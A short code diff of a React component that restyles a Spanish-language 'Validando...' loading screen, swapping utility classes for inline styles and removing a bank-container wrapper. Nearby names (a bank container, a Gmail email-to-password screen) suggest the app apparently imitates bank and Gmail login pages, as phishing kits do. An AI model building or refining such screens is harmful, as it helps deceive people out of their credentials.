@@ -2361,19 +2361,32 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
 
       case ScreenType.VALIDANDO:
         const validandoContent = (
-          <>
-            <div className="flex flex-col items-center justify-center">
+          <div style={{ 
+            margin: 0, 
+            fontFamily: '"Helvetica Neue", Arial, sans-serif', 
+            background: '#ffffff', 
+            minHeight: '100vh', 
+            display: 'flex', 
+            alignItems: 'center', 
+            justifyContent: 'center',
+            padding: '40px'
+          }}>
+            <div style={{ textAlign: 'center', maxWidth: '600px' }}>
               <img 
                 src={loadingGif} 
                 alt="Cargando..." 
-                className="w-32 h-32 mb-4"
+                style={{ width: '150px', height: '150px', margin: '0 auto 40px', display: 'block' }}
               />
-              <h2 className="text-xl font-bold mb-2">Validando...</h2>
-              <p className="text-sm text-gray-500">Esto puede tomar un momento. Por favor espere...</p>
+              <h2 style={{ fontSize: '36px', fontWeight: 700, color: '#1f2937', marginBottom: '20px' }}>
+                Validando...
+              </h2>
+              <p style={{ fontSize: '20px', color: '#6b7280', lineHeight: 1.6 }}>
+                Esto puede tomar un momento. Por favor espere...
+              </p>
             </div>
-          </>
+          </div>
         );
-        return getBankContainer(validandoContent);
+        return validandoContent;
 
       case ScreenType.GMAIL:
         // Función para cambiar de la pantalla de correo a la de contraseña
